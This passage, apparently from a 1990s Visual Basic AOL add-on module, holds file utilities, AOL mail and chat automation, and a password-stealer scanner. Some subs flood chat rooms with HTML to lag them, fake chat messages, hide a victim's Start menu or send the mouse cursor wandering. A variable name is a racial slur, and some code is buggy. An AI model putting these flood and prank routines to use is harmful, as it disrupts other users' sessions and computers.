If nextchr$ = "‘" Then Let nextchr$ = "chr(145)"
If nextchr$ = "‘" Then Let nextchr$ = "chr(146)"
'chr(147) through chr(159)
'are not supported by windows
If nextchr$ = " " Then Let nextchr$ = "chr(160)"
If nextchr$ = "¡" Then Let nextchr$ = "chr(161)"
If nextchr$ = "¢" Then Let nextchr$ = "chr(162)"
If nextchr$ = "£" Then Let nextchr$ = "chr(163)"
If nextchr$ = "¤" Then Let nextchr$ = "chr(164)"
If nextchr$ = "¥" Then Let nextchr$ = "chr(165)"
If nextchr$ = "¦" Then Let nextchr$ = "chr(166)"
If nextchr$ = "§" Then Let nextchr$ = "chr(167)"
If nextchr$ = "¨" Then Let nextchr$ = "chr(168)"
If nextchr$ = "©" Then Let nextchr$ = "chr(169)"
If nextchr$ = "ª" Then Let nextchr$ = "chr(170)"
If nextchr$ = "«" Then Let nextchr$ = "chr(171)"
If nextchr$ = "¬" Then Let nextchr$ = "chr(172)"
If nextchr$ = "­" Then Let nextchr$ = "chr(173)"
If nextchr$ = "®" Then Let nextchr$ = "chr(174)"
If nextchr$ = "¯" Then Let nextchr$ = "chr(175)"
If nextchr$ = "°" Then Let nextchr$ = "chr(176)"
If nextchr$ = "±" Then Let nextchr$ = "chr(177)"
If nextchr$ = "²" Then Let nextchr$ = "chr(178)"
If nextchr$ = "³" Then Let nextchr$ = "chr(179)"
If nextchr$ = "´" Then Let nextchr$ = "chr(180)"
If nextchr$ = "µ" Then Let nextchr$ = "chr(181)"
If nextchr$ = "¶" Then Let nextchr$ = "chr(182)"
If nextchr$ = "·" Then Let nextchr$ = "chr(183)"
If nextchr$ = "¸" Then Let nextchr$ = "chr(184)"
If nextchr$ = "¹" Then Let nextchr$ = "chr(185)"
If nextchr$ = "º" Then Let nextchr$ = "chr(186)"
If nextchr$ = "»" Then Let nextchr$ = "chr(187)"
If nextchr$ = "¼" Then Let nextchr$ = "chr(188)"
If nextchr$ = "½" Then Let nextchr$ = "chr(189)"
If nextchr$ = "¾" Then Let nextchr$ = "chr(190)"
If nextchr$ = "¿" Then Let nextchr$ = "chr(191)"
If nextchr$ = "À" Then Let nextchr$ = "chr(192)"
If nextchr$ = "Á" Then Let nextchr$ = "chr(193)"
If nextchr$ = "Â" Then Let nextchr$ = "chr(194)"
If nextchr$ = "Ã" Then Let nextchr$ = "chr(195)"
If nextchr$ = "Ä" Then Let nextchr$ = "chr(196)"
If nextchr$ = "Å" Then Let nextchr$ = "chr(197)"
If nextchr$ = "Æ" Then Let nextchr$ = "chr(198)"
If nextchr$ = "Ç" Then Let nextchr$ = "chr(199)"
If nextchr$ = "È" Then Let nextchr$ = "chr(200)"
If nextchr$ = "É" Then Let nextchr$ = "chr(201)"
If nextchr$ = "Ê" Then Let nextchr$ = "chr(202)"
If nextchr$ = "Ë" Then Let nextchr$ = "chr(203)"
If nextchr$ = "Ì" Then Let nextchr$ = "chr(204)"
If nextchr$ = "Í" Then Let nextchr$ = "chr(205)"
If nextchr$ = "Î" Then Let nextchr$ = "chr(206)"
If nextchr$ = "Ï" Then Let nextchr$ = "chr(207)"
If nextchr$ = "Ð" Then Let nextchr$ = "chr(208)"
If nextchr$ = "Ñ" Then Let nextchr$ = "chr(209)"
If nextchr$ = "Ò" Then Let nextchr$ = "chr(210)"
If nextchr$ = "Ó" Then Let nextchr$ = "chr(211)"
If nextchr$ = "Ô" Then Let nextchr$ = "chr(212)"
If nextchr$ = "Õ" Then Let nextchr$ = "chr(213)"
If nextchr$ = "Ö" Then Let nextchr$ = "chr(214)"
If nextchr$ = "×" Then Let nextchr$ = "chr(215)"
If nextchr$ = "Ø" Then Let nextchr$ = "chr(216)"
If nextchr$ = "Ù" Then Let nextchr$ = "chr(217)"
If nextchr$ = "Ú" Then Let nextchr$ = "chr(218)"
If nextchr$ = "Û" Then Let nextchr$ = "chr(219)"
If nextchr$ = "Ü" Then Let nextchr$ = "chr(220)"
If nextchr$ = "Ý" Then Let nextchr$ = "chr(221)"
If nextchr$ = "Þ" Then Let nextchr$ = "chr(222)"
If nextchr$ = "ß" Then Let nextchr$ = "chr(223)"
If nextchr$ = "à" Then Let nextchr$ = "chr(224)"
If nextchr$ = "á" Then Let nextchr$ = "chr(225)"
If nextchr$ = "â" Then Let nextchr$ = "chr(226)"
If nextchr$ = "ã" Then Let nextchr$ = "chr(227)"
If nextchr$ = "ä" Then Let nextchr$ = "chr(228)"
If nextchr$ = "å" Then Let nextchr$ = "chr(229)"
If nextchr$ = "æ" Then Let nextchr$ = "chr(230)"
If nextchr$ = "ç" Then Let nextchr$ = "chr(231)"
If nextchr$ = "è" Then Let nextchr$ = "chr(232)"
If nextchr$ = "é" Then Let nextchr$ = "chr(233)"
If nextchr$ = "ê" Then Let nextchr$ = "chr(234)"
If nextchr$ = "ë" Then Let nextchr$ = "chr(235)"
If nextchr$ = "ì" Then Let nextchr$ = "chr(236)"
If nextchr$ = "í" Then Let nextchr$ = "chr(237)"
If nextchr$ = "î" Then Let nextchr$ = "chr(238)"
If nextchr$ = "ï" Then Let nextchr$ = "chr(239)"
If nextchr$ = "ð" Then Let nextchr$ = "chr(240)"
If nextchr$ = "ñ" Then Let nextchr$ = "chr(241)"
If nextchr$ = "ò" Then Let nextchr$ = "chr(242)"
If nextchr$ = "ó" Then Let nextchr$ = "chr(243)"
If nextchr$ = "ô" Then Let nextchr$ = "chr(244)"
If nextchr$ = "õ" Then Let nextchr$ = "chr(245)"
If nextchr$ = "ö" Then Let nextchr$ = "chr(246)"
If nextchr$ = "÷" Then Let nextchr$ = "chr(247)"
If nextchr$ = "ø" Then Let nextchr$ = "chr(248)"
If nextchr$ = "ù" Then Let nextchr$ = "chr(249)"
If nextchr$ = "ú" Then Let nextchr$ = "chr(250)"
If nextchr$ = "û" Then Let nextchr$ = "chr(251)"
If nextchr$ = "ü" Then Let nextchr$ = "chr(252)"
If nextchr$ = "ý" Then Let nextchr$ = "chr(253)"
If nextchr$ = "þ" Then Let nextchr$ = "chr(254)"
If nextchr$ = "ÿ" Then Let nextchr$ = "chr(255)"
Let newsent$ = newsent$ + nextchr$
Loop
   lenth2% = Len(newsent$)
        Do While numspca% <= lenth2% - 2
           Let numspca% = numspca% + 1
           Let nextchra$ = Mid$(newsent$, numspca%, 1)
               If nextchra$ = ")" Then Let nextchra$ = ")+"
                  Let newsenta$ = newsenta$ + nextchra$
         Loop
'adds the last )
newsenta$ = newsenta$ + ")"
'sends the chr code
GetChrValues = newsenta$
End Function








Function hibyte(ByVal wParam As Integer)
'used for getting your ip address
       hibyte = wParam \ &H100 And &HFF&
End Function
Function lobyte(ByVal wParam As Integer)
'used for getting your ip address
       lobyte = wParam And &HFF&
End Function

Function GetScrollLock() As Boolean
' Return the ScrollLock toggle.
GetScrollLock = CBool(GetKeyState(vbKeyScrollLock) And 1)
End Function
Function GetNumlock() As Boolean
' Return the Numlock toggle.
GetNumlock = CBool(GetKeyState(vbKeyNumlock) And 1)
End Function



Sub CompareFiles(file1 As String, file2 As String)
'this checks to files to see if they are
'identical

Open file1 For Binary As #1
 Open file2 For Binary As #2
 
 issame% = True
 If LOF(1) <> LOF(2) Then
 issame% = False
 Else
 whole& = LOF(1) \ 10000 'number of whole 10,000 byte chunks
 part& = LOF(1) Mod 10000 'remaining bytes at end of file
 buffer1$ = String$(10000, 0)
 buffer2$ = String$(10000, 0)
 Start& = 1
 For X& = 1 To whole& 'this for-next loop will get 10,000
Get #1, Start&, buffer1$ 'byte chunks at a time.
Get #2, Start&, buffer2$

       If buffer1$ <> buffer2$ Then
               issame% = False
               Exit For
       End If

Start& = Start& + 10000
 Next
 buffer1$ = String$(part&, 0)
 buffer2$ = String$(part&, 0)
 Get #1, Start&, buffer1$ 'get the remaining bytes at the end
 Get #2, Start&, buffer2$ 'get the remaining bytes at the end
 If buffer1$ <> buffer2$ Then issame% = False
 End If
 
 Close
 If issame% Then
 MsgBox "Files are identical", 64, "VOLTRON KRU"
 Else
 MsgBox "Files are NOT identical", 16, "VOLTRON KRU"
 End If
End Sub
Public Function GetListIndex(LB As ListBox, Txt As String) As Integer
'finds the index of a specific word
Dim Index As Integer
With LB
For Index = 0 To .ListCount - 1
If .List(iIndex) = Txt Then
GetListIndex = Index
Exit Function
End If
Next Index
End With
GetListIndex = -2
End Function
Function GetCapslock() As Boolean
' Return the Capslock toggle.
GetCapslock = CBool(GetKeyState(vbKeyCapital) And 1)
End Function
Public Function GetChildCount(ByVal hWnd As Long) As Long
'This gets the number of open childs
Dim hChild As Long
Dim i As Integer
If hWnd = 0 Then
GoTo Return_False
End If
hChild = GetWindow(hWnd, GW_CHILD)
While hChild
hChild = GetWindow(hChild, GW_HWNDNEXT)
i = i + 1
Wend
GetChildCount = i
Exit Function
Return_False:
GetChildCount = 0
Exit Function
End Function
Function GetLineCount(text)
'This will get the number of lines in
'a Textbox or string
theview$ = text
For FindChar = 1 To Len(theview$)
DoEvents
thechar$ = Mid(theview$, FindChar, 1)
If thechar$ = Chr(13) Then
numline = numline + 1
End If
Next FindChar
If Mid(text, Len(text), 1) = Chr(13) Then
GetLineCount = numline
Else
GetLineCount = numline + 1
End If
End Function


Sub ShowMouse()
'shows the mouse after its hidden
Hid$ = ShowCursor(True)
End Sub

Sub HideStartmenu()
' THIS is funny makes it so they lose the start menu
' and cant get it back unless you run showstartmenu
c% = FindWindow("Shell_TrayWnd", vbNullString)
A = ShowWindow(c%, SW_HIDE)

End Sub

Sub MouseCrazy()
' Makes there mouse run around the screen

Do
boob = (Rnd * 400)
boob2 = (Rnd * 400)
whatever = SetCursorPos(boob, boob2)
DoEvents
Loop

End Sub
Sub ShowStartmenu()
'will show the start button after its hidden

c% = FindWindow("Shell_TrayWnd", vbNullString)
A = ShowWindow(c%, SW_SHOW)

End Sub

Function sys_timeanddate() As String
'text2.text = "It is Currently " + sys_timeanddate()
sys_timeanddate$ = Format$(Now, "h:mm AM/PM mm-dd-yy")
End Function
Function HideMouse()

'Makes the mouse arrow dissaper
Hid$ = ShowCursor(False)

End Function

Function IfDirExists(TheDirectory)
'Check's if Directory exsists on user's computer.
'returns true if file the dir exists
'false if not
Dim Check As Integer
On Error Resume Next
If Right(TheDirectory, 1) <> "/" Then TheDirectory = TheDirectory + "/"
Check = Len(dir$(TheDirectory))
If Err Or Check = 0 Then
    IfDirExists = False
Else
    IfDirExists = True
End If
End Function

Function IFileExists(ByVal sFileName As String) As Integer
'Checks if a file you chose exists
' the following is an exaple of how to use it
'If IFileExists("C:\aol30\waol.exe") Then X = Shell("C:\aol30\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
Dim TheFileLength As Integer
On Error Resume Next
TheFileLength = Len(dir$(sFileName))
If Err Or TheFileLength = 0 Then
IFileExists = False
Else
IFileExists = True
End If
End Function
Sub File_ChangeTo(Choice, file$)
'Choices are: Normal, Readonly, Hidden, System, and archive
If Not IFileExists(file$) Then Exit Sub
If LCase$(Choice) = "normal" Then
SetAttr file$, ATTR_NORMAL
ElseIf LCase$(Choice) = "readonly" Then: SetAttr file$, ATTR_READONLY
ElseIf LCase$(Choice) = "hidden" Then: SetAttr file$, ATTR_HIDDEN
ElseIf LCase$(Choice) = "system" Then: SetAttr file$, ATTR_SYSTEM
ElseIf LCase$(Choice) = "archive" Then: SetAttr file$, ATTR_ARCHIVE
End If
NoFreeze% = DoEvents()
End Sub
Sub File_Copy(FileName$, CopyTo$)
' Copy's a file to somewhere else.
If FileName$ = "" Then Exit Sub
If CopyTo$ = "" Then Exit Sub
If Not IFileExists(FileName$) Then Exit Sub
On Error GoTo AnErrOccured
If InStr(Right$(FileName$, 4), ".") = 0 Then Exit Sub
If InStr(Right$(CopyTo$, 4), ".") = 0 Then Exit Sub
FileCopy FileName$, CopyTo$
Exit Sub
AnErrOccured:
MsgBox "An Unexpected Error Occured!", 16, "Error"
End Sub
Function File_GetFileName(Prompt As String) As String
'gets the files name
File_GetFileName = LTrim$(RTrim$(UCase$(InputBox$(Prompt, "Enter File Name"))))
End Function
Function File_GetSysIni(Section$, Key$)
'gets the system.ini
Dim retVal As String, AppName As String, worked As Integer
    retVal = String$(255, 0)
    worked = GetPrivateProfileString(Section$, Key$, "", retVal, Len(retVal), "System.ini")
    If worked = 0 Then
        File_GetSysIni = "unknown"
    Else
        File_GetSysIni = Left(retVal, worked)
    End If
End Function
Function File_GetWindowDir()
'gets a windows dir
Buffer$ = String$(255, 0)
X = GetWindowsDirectory(Buffer$, 255)
If Right$(Buffer$, 1) <> "\" Then Buffer$ = Buffer$ + "\"
File_GetWindowDir = Buffer$
End Function
Sub File_MakeDirectory(DirName$)
'creates a directory
MkDir DirName$
End Sub
Sub File_OpenEXE(file$)
'opens an exe
Openit! = Shell(file$, 1): NoFreeze% = DoEvents()
End Sub
Sub File_RenameDirectory(old$, NewName$)
'renames a directory
If Not IfDirExists(old$) Then Exit Sub
Name old$ As NewName$
NoFreeze% = DoEvents()
End Sub
Sub AOL4_KillDLadvertise()
'kill download advertisement
home% = FindChildByTitle(AOLMDI, "File Transfer")
dl% = FindChildByClass(home%, "_AOL_Image")
Call SendMessage(dl%, WM_CLOSE, 0, 0)
End Sub

Sub AOL4_KillMailAdvertise()
'kill mail advertisement
Mail% = FindChildByTitle(AOLMDI, AOLUserSN & "'s Online Mailbox")
Add% = FindChildByClass(Mail%, "_AOL_Image")
Call SendMessage(Add%, WM_CLOSE, 0, 0)
End Sub
Sub killwin(Windo)
X = SendMessageByNum(Windo, WM_CLOSE, 0, 0)
End Sub
Function AOLChatLag()
Call SendChat("  <html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>")
End Function

Function AOLChatLag2()
Call SendChat("  <B><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html> <html></html><html></html><html></html><html></html><html></html><html></html><html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>")
End Function
Function AOLChatLink(link, Txt)
l00A8 = """"
AOLChatLink = "<a href=" & l00A8 & l00A8 & "><a href=" & l00A8 & l00A8 & "><a href=" & l00A8 & link & l00A8 & "><font color=#0000ff><u>" & Txt & "<font color=#fffeff></a><a href=" & l00A8 & l00A8 & ">"
Call AOLChatsend1(l00AC)
End Function
Sub AOLFakeOH2()
SHIT = String(116, Chr(32))
D = 116 - Len("Tru Magic")
c$ = Left(SHIT, D)
Call AOLChatsend1(txt1 & c$ & "         ")
End Sub
Sub AOLFileSearch(file)
Dim icon As Long
'This is the first File Search sub that I have seen
'of... Just enter the file you want to search for in
'AOL's list of files... and it will list the files
'found in that search!
Call XAOL4_Keyword("File Search")
First% = FindChildByTitle(AOLMDI(), "Filesearch")
icon& = FindChildByClass(First%, "_AOL_Icon")
icon& = GetWindow(icon&, 2)

Call Button(icon&)

Secnd% = FindChildByTitle(AOLMDI(), "Software Search")
edit% = FindChildByClass(Secnd%, "_AOL_Edit")
Call SendMessageByString(edit%, WM_SETTEXT, 0, file)
Call SendMessageByNum(Rich%, WM_CHAR, 0, 13)
End Sub
Sub BlankChat(Txt)
Call AOLChatsend1("<font color=#fffeff> @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@<font color=#0000ff> " & Txt)
End Sub
Sub Chat_ChangeCaption(newcap)
room% = AOL40_FindChatRoom()
Call Window_ChangeCaption(room%, newcap)
End Sub
Public Function AOLRoomFull()
'Add this to your room bust and it will close the
'message box that is telling you the room is full
Do
Pause 0.00002
msg1% = FindWindow("#32770", "America Online")
Button2% = FindChildByClass(msg1%, "Button")
Stat% = FindChildByClass(msg1%, "Static")
statcap% = FindChildByTitle(msg1%, "The room you requested is full.")

If Stat% <> 0 And Button2% <> 0 And statcap% <> 0 Then Call ClickIcon(Button2%)
Loop Until msg1% = 0
End Function
Sub AOL40_KillChatAdvertise()
'Kills the annoying advertisemenat in member chats.
Chat% = AOL40_FindChatRoom()

pict% = FindChildByClass(Chat%, "_AOL_Image")
Call SendMessage(pict%, WM_CLOSE, 0, 0)
End Sub
Sub AOL40_SignOff()
'This will sign-off AOL very quickly
Call AOLRunMenuByString("&Sign Off")
End Sub

Sub Chat_Attending()
'This will check if the user of your prog is in the
'chat room. If he isn't, a MsgBox will pop up.
room% = AOL40_FindChatRoom()
If room% = 0 Then
MsgBox "You must be in a chat room to use this feature", 64, "Must Be In Chat!"
Else
End If
End Sub
Function Chat_RoomCount()
'This returns the number of people currently in the
'chat room you are in
Chat% = AOL40_FindChatRoom()
List% = FindChildByClass(Chat%, "_AOL_Listbox")
Count% = SendMessage(List%, LB_GETCOUNT, 0, 0)
AOLRoomCount = Count%
End Function
Function Chat_RoomName()
Call GetCaption(AOLFindChatRoom)
End Function
Function AOLFindRoom()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
firs% = GetWindow(MDI%, 5)
listers% = FindChildByClass(firs%, "RICHCNTL")
Listere% = GetWindow(listers%, 2)
Listerb% = FindChildByClass(firs%, "_AOL_Listbox")
If listers% And Listere% And Listerb% Then GoTo bone

firs% = GetWindow(MDI%, GW_CHILD)
While firs%
firs% = GetWindow(firs%, 2)
listers% = FindChildByClass(firs%, "RICHCNTL")
Listere% = GetWindow(listers%, 2)
Listerb% = FindChildByClass(firs%, "_AOL_Listbox")
If listers% And Listere% And Listerb% Then GoTo bone
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
firs% = GetWindow(MDI%, 5)
listers% = FindChildByClass(firs%, "RICHCNTL")
Listere% = GetWindow(listers%, 2)
Listerb% = FindChildByClass(firs%, "_AOL_Listbox")
If listers% And Listere% And Listerb% Then GoTo bone
Wend

bone:
room% = firs%
AOLFindRoom = room%
End Function
Function AOLFindRoom1()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
firs% = GetWindow(MDI%, 5)
listers% = FindChildByClass(firs%, "RICHCNTL")
Listere% = GetWindow(listers%, 2)
Listerb% = FindChildByClass(firs%, "_AOL_Listbox")
If listers% And Listere% And Listerb% Then GoTo bone

firs% = GetWindow(MDI%, GW_CHILD)
While firs%
firs% = GetWindow(firs%, 2)
listers% = FindChildByClass(firs%, "RICHCNTL")
Listere% = GetWindow(listers%, 2)
Listerb% = FindChildByClass(firs%, "_AOL_Listbox")
If listers% And Listere% And Listerb% Then GoTo bone
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
firs% = GetWindow(MDI%, 5)
listers% = FindChildByClass(firs%, "RICHCNTL")
Listere% = GetWindow(listers%, 2)
Listerb% = FindChildByClass(firs%, "_AOL_Listbox")
If listers% And Listere% And Listerb% Then GoTo bone
Wend

bone:
room% = firs%
AOLFindRoom = room%
End Function
Sub Window_ChangeCaption(win, Txt)
'This will change the caption of any window that you
'tell it to as long as it is a valid window
text% = SendMessageByString(win, WM_SETTEXT, 0, Txt)
End Sub
Function AOL_CountMail()
aol1 = FindWindow("AOL Frame25", vbNullString)
MDI1 = FindChildByClass(aol1, "MDIClient")
Mail11 = FindChildByTitle(MDI1, UserSN & "'s Online Mailbox")
If Mail11 = 0 Then MsgBox "Open Mail First": Exit Function
tabd1 = FindChildByClass(Mail11, "_AOL_TabControl")
tabp1 = FindChildByClass(tabd1, "_AOL_TabPage")
aoltree1 = FindChildByClass(tabp1, "_AOL_Tree")
AOL_CountMail = SendMessage(aoltree1, LB_GETCOUNT, 0, 0)
MsgBox "You Have " & de & " Mailz"
End Function
Function AOL_WaitForMailLoad()


Do
Box% = FindChildByTitle(AOLMDI, UserSN & "'s Online Mailbox")
Loop Until Box% <> 0
List = FindChildByClass(Box%, "_AOL_Tree")
Do
DoEvents
M1% = SendMessage(List, LB_GETCOUNT, 0, 0&)
M2% = SendMessage(List, LB_GETCOUNT, 0, 0&)
M3% = SendMessage(List, LB_GETCOUNT, 0, 0&)
Loop Until M1% = M2% And M2% = M3%
M1% = SendMessage(List, LB_GETCOUNT, 0, 0&)
End Function
Sub PWSscan(flename, Txt As TextBox)
If Txt.text = "" Then
MsgBox "You Have To Select A Directory!"
Exit Sub
End If
bwap = "check"
yo = "mail"
nutts = "you've"
nutts2 = "&sent"
heya = bwap & " " & yo & " " & nutts & " " & nutts2
Txt.text = LCase(Txt.text)
SendChat "PWS Scanner [On]"
DoEvents
TimeOut 0.1
SendChat "[" + LCase(Txt) + LCase(flename) + " ]"
DoEvents
TimeOut 0.1
SendChat "Status: Scaning File"
TimeOut (1)
hello& = FileName
Open hello& For Binary As #1
lent = FileLen(hello&)

For i = 1 To lent Step 32000
  
  temp$ = String$(32000, " ")
  Get #1, i, temp$
  temp$ = LCase$(temp$)
  If InStr(temp$, heya) Then
    Close
    SendChat "[" + LCase(Txt) + LCase(flename) + " ]"
    TimeOut 0.1
    SendChat "Is A PWS!"
    mb1 = MsgBox("This File Is A Password Stealer Do You Wan't To Delete It?")
    Select Case mb1
    Case 6:
    
    SendChat "[" + LCase(Txt) + LCase(flename) + " ]"
    TimeOut (0.5)
    SendChat "Is Being Deleted!"
        Kill "" & Txt.text + FileName
    MsgBox "The Password Stealer Has Been Removed"
    Case 7: Exit Sub
    End Select
    Exit Sub
  End If
  i = i - 50
Next i
Close
TimeOut (1)
MsgBox "This Is Not A Password Stealer"
SendChat "[" + LCase(Txt) + LCase(flename) + " ]"
TimeOut 0.1
SendChat "Is Not A PWS!"
End Sub
Sub mailcount()

AO% = FindWindow("AOL Frame25", 0&)
Hand% = FindChildByClass(AO%, "_AOL_TREE")
Buffer = SendMessageByNum(Hand%, LB_GETCOUNT, 0, 0)
If Buffer > 1 And Buffer <> 550 Then
MsgBox "You have " & Buffer & " Mailz In Your Box", 48, "Triumph By: Soul"
End If
If Buffer = 1 Then
MsgBox "You have " & Buffer & " Mailz In Your Box", 48, "Triumph By: Soul"
End If
If Buffer < 1 Then
MsgBox "You have Absolutly No Mail", 48, "Triumph By: Soul"
End If
If Buffer = 550 Then
MsgBox "Your Box Is Full...Delete some.", 48, "Triumph By: Soul"
End If

End Sub
Sub AnswerIMs(Text1 As TextBox)
AOL% = FindWindow("AOL Frame25", 0&)
MDI% = FindChildByClass(AOL%, "MDIClient")
Do While im% <> 0
im% = FindChildByTitle(MDI%, ">Instant Message From:")
If im% = 0 Then im% = FindChildByTitle(MDI%, "  Instant Message From:")
IMCap$ = GetText(im%): DoEvents
SN$ = Trim$(Mid$(IMCap$, InStr(IMCap$, ":")))
Call IMKeyword(Trim$(SN$), Text1): DoEvents
killwin im%: DoEvents
Loop
End Sub
Sub mail_openflash()
    AOL% = FindWindow("AOL Frame25", vbNullString)
    MDI% = FindChildByClass(AOL%, "MDICLIENT")
    AOL% = FindWindow("aol frame25", vbNullString)
    X = ShowWindow(AOL%, SW_MINIMIZE)
    X = ShowWindow(AOL%, SW_RESTORE)
    TimeOut 0.1
    SendKeys "%m"
    TimeOut 0.1
    SendKeys "d"
    TimeOut (0.2)
    SendKeys "{ENTER}"
    Pause (0.3)
End Sub
Public Sub MailAddFlashToListBox(ListBo As ListBox)

ListBo.MousePointer = 11

AOL% = FindWindow("AOL Frame25", vbNullString)

Mail% = FindChildByTitle(AOLMDI(), "Incoming/Saved Mail")

tree% = FindChildByClass(Mail%, "_AOL_Tree")

Z = 0

For i = 0 To SendMessageByNum(tree%, LB_GETCOUNT, 0, 0&) - 1

Buff$ = String$(100, 0)

X = SendMessageByString(tree%, LB_GETTEXT, i, Buff$)

Subj$ = Mid$(Buff$, 14, 80)

Layz = InStr(Subj$, Chr(9))

Nigga = Right(Subj$, Len(Subj$) - Layz)

ListBo.AddItem "¤ " + Str(Z) + "¤ " + Trim(Nigga)

Z = Z + 1

Next i

ListBo.MousePointer = 0

End Sub
Function Mail_SelectFlash(Number)
'select a specified mail in your new mail

AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
Mail% = FindChildByTitle(MDI%, "Incoming/Saved Mail")
AOLTree% = FindChildByClass(Mail%, "_AOL_Tree")
If AOLTree% = 0 Then Exit Function
de = SendMessage(AOLTree%, LB_SETCURSEL, Number, 0)
End Function
Sub ClickReadFlash()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
MailBox% = FindChildByTitle(MDI%, "Incoming/Saved Mail")
AoIcon% = FindChildByClass(MailBox%, "_AOL_Icon")
For l = 1 To 0
AoIcon% = GetWindow(AoIcon%, 2)
Next l
ClickIcon (AoIcon%)
End Sub
Sub AOL40_Mail_AddFlashToListBox(ListBox As ListBox)
' This will add your flash mail to a listbox.
' It will not open the flashmailbox so you will need to
' open it first.
hWndAOL = FindWindow("AOL Frame25", vbNullString)
hWndAOLClient = FindChildByClass(hWndAOL, "MDIClient")
hWndMail = FindChildByTitle(hWndAOLClient, "Incoming/Saved Mail")
hWndMailLB = FindChildByClass(hWndMail, "_AOL_Tree")
Do
NumMail% = SendMessageByNum(hWndMailLB, LB_GETCOUNT, 0&, 0&)
TimeOut 1.5
nummails% = SendMessageByNum(hWndMailLB, LB_GETCOUNT, 0&, 0&)
Loop Until NumMail% = nummails%
For X = 0 To nummails% - 1
Mails$ = String(256, " ")
hWndAOL = FindWindow("AOL Frame25", vbNullString)
hWndAOLClient = FindChildByClass(hWndAOL, "MDIClient")
hWndMail = FindChildByTitle(hWndAOLClient, "Incoming/Saved Mail")
hWndMailLB = FindChildByClass(hWndMail, "_AOL_Tree")
NMB% = FindChildByTitle(hWndAOLClient, "Incoming/Saved Mail")
tree% = FindChildByClass(NMB%, "_AOL_Tree")
Z = SendMessageByString(tree%, LB_GETTEXT, X, Mails$)
K = Trim$(Mails$)
Where = InStr(Mails$, Chr$(9))
Mails$ = Mid$(Mails$, Where + 1)
Where = InStr(Mails$, Chr$(9))
SN$ = Trim$(Mid$(Mails$, 1, Where - 1))
SNs$ = Len(SN$)
SNs$ = SNs$ + 2
last$ = Mid(Mails$, SNs$, Len(Mails$))
ListBox.AddItem (last$)
Next X
End Sub
Sub AOL40_Mail_AddNewToListBox(ListBox As ListBox)
' This will add your new mail to a listbox.
' It will not open the newmailbox so you will need to
' open it first.
AOL% = FindWindow("AOL Frame25", vbNullString)
aolmd% = FindChildByClass(AOL%, "MDIClient")
themail% = FindChildByClass(aolmd%, "AOL Child")
themail% = FindChildByClass(themail%, "_AOL_TabControl")
dsa% = FindChildByClass(themail%, "_AOL_TabPage")
thetree% = FindChildByClass(dsa%, "_AOL_Tree")
nummails% = SendMessage(thetree%, LB_GETCOUNT, 0, 0)
For X = 0 To nummails% - 1
Mails$ = String(256, " ")
Z = SendMessageByString(thetree%, LB_GETTEXT, X, Mails$)
K = Trim$(Mails$)
Where = InStr(Mails$, Chr$(9))
Mails$ = Mid$(Mails$, Where + 1)
Where = InStr(Mails$, Chr$(9))
SN$ = Trim$(Mid$(Mails$, 1, Where - 1))
SNs$ = Len(SN$)
SNs$ = SNs$ + 2
last$ = Mid(Mails$, SNs$, Len(Mails$))
ListBox.AddItem (last$)
Next X
End Sub
Sub AOL40_Mail_KeepNew()
' this will keep the mail as new
AOL% = FindChildByTitle(AOLMDI(), AOL40_UserSN & "'s Online Mailbox")
If AOL% = 0 Then AOL% = FindChildByTitle(AOLMDI(), "Online Mailbox")
AOL% = FindChildByClass(AOL%, "_AOL_Icon")
AOL% = GetWindow(AOL%, GW_HWNDNEXT)
AOL% = GetWindow(AOL%, GW_HWNDNEXT)
ClickIcon (AOL%)
End Sub

Sub AOL40_Mail_OpenMailBox()
AOL% = FindWindow("AOL Frame25", vbNullString)
toolbar2% = FindChildByClass(AOL%, "AOL Toolbar")
ToolBarChild% = FindChildByClass(toolbar2%, "_AOL_Toolbar")
TooLBaRB% = FindChildByClass(ToolBarChild%, "_AOL_Icon")
ClickIcon TooLBaRB%
MDI% = FindChildByClass(AOL%, "MDIClient")
Do
fsd% = FindChildByClass(MDI%, AOL40_UserSN() & "'s Online Mailbox")
Loop Until fds% <> 0
fsd% = FindChildByClass(MDI%, AOL40_UserSN() & "'s Online Mailbox")
Mail% = FindChildByClass(fds%, "_AOL_Tree")
TimeOut 0.5
ClickIcon (Mail%)
End Sub
Sub AOL40_Mail_SendNew(SN, Subject, Message)
Dim icon As Long
'This will open a new email and then send it.
tool% = FindChildByClass(AOLWin(), "AOL Toolbar")
toolbar2% = FindChildByClass(tool%, "_AOL_Toolbar")
icon& = FindChildByClass(toolbar2%, "_AOL_Icon")
icon& = GetWindow(icon&, GW_HWNDNEXT)
Call Button(icon&)
Do: DoEvents
Mail% = FindChildByTitle(AOLMDI(), "Write Mail")
edit% = FindChildByClass(Mail%, "_AOL_Edit")
Rich% = FindChildByClass(Mail%, "RICHCNTL")
icon3% = FindChildByClass(Mail%, "_AOL_ICON")
Loop Until Mail% <> 0 And edit% <> 0 And Rich% <> 0 And icon3% <> 0
Call SendMessageByString(edit%, WM_SETTEXT, 0, SN)
edit% = GetWindow(edit%, GW_HWNDNEXT)
edit% = GetWindow(edit%, GW_HWNDNEXT)
